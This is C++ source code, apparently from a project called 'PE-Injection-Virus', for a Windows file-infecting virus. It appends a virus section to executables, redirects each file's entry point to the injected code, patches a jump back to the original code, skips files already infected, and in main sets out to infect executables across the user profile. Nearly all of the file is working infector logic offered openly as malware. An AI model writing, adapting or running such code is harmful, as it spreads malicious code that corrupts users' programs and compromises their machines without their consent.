#include "everything.h"

#include "shared.h"

#include <fstream>
#include <filesystem>
#include <vector>

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);

int main();

std::vector<unsigned char> section_data_global;

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
{

    DWORD virus_va_in_target;
    DWORD virus_ra_in_target;

    DWORD target_entry_point = GetEntryPoint(file_data);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data_global.data(), (DWORD)section_data_global.size(), data);

    virus_va_in_target = virus_section_in_target->VirtualAddress;
    virus_ra_in_target = virus_section_in_target->PointerToRawData;

    if (Is64BitExecutable(file_data))
    {
        DWORD entry_point_64bit = 0x28F0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949);
    }
    else
    {
        DWORD entry_point_32bit = 0xca0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
    }

    *(DWORD*)new_file_size = (DWORD)file_size + (DWORD)section_data_global.size();
    return;
}

void WINAPI InfectFile(PSTR file_name, PDATA data)
{
    HANDLE handle_file;
    HANDLE handle_mapped_file;
    PVOID mapped_file_address;
    ULONG file_size, new_file_size, bytes_read;
    PVOID file_data = NULL;
    DWORD number_of_bytes_written = 0;

    handle_file = data->iat->fnCreateFileA(
        file_name, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,
        0,NULL
    );

    if (handle_file == INVALID_HANDLE_VALUE)
    {
        goto END_FUNCTION;
    }

    file_size = data->iat->fnGetFileSize(handle_file, NULL);
    new_file_size = file_size;
    
    file_data = data->iat->fnVirtualAlloc(
        NULL, 
        file_size + 0x1000000, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!file_data)
    {
        goto END_FUNCTION;
    }

    if (!data->iat->fnReadFile(handle_file, file_data, file_size, &bytes_read, NULL))
    {
        goto END_FUNCTION;
    }

    if (!IsValidExecutable(file_data) || IsVirusExistedInFile(file_data))
    {
        goto END_FUNCTION;
    }

    AddVirusToFile(file_data, file_size, data, &new_file_size);

    handle_mapped_file = data->iat->fnCreateFileMappingA(handle_file, NULL, PAGE_READWRITE, 0, new_file_size, NULL);
    if (!handle_mapped_file)
    {
        goto END_FUNCTION;
    }

    mapped_file_address = data->iat->fnMapViewOfFile(handle_mapped_file, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    MemCopy(mapped_file_address, file_data, new_file_size);
    
    data->iat->fnFlushViewOfFile(mapped_file_address,0);
    data->iat->fnUnmapViewOfFile(mapped_file_address);
    data->iat->fnCloseHandle(handle_mapped_file);

    END_FUNCTION:
    if (handle_file != NULL)
    {
        data->iat->fnCloseHandle(handle_file);
    }
    if (file_data != NULL)
    {
        data->iat->fnVirtualFree(file_data, 0, MEM_RELEASE);
    }
    return;
} 

int main()
{

    std::string virus_path = "E:\\Code\\Github\\PE-Injection-Virus\\virus_code_section";
    std::filesystem::path p{virus_path};
    section_data_global.resize(std::filesystem::file_size(p));
    std::ifstream ifs32(virus_path, std::ios_base::binary);
    ifs32.read((char *)&section_data_global[0], std::filesystem::file_size(p));

    IAT iat;
    DATA data;
    data.iat = &iat;
    GetFunctionAddresses(&data);
    InfectUserProfile(&data);
    return 0;
}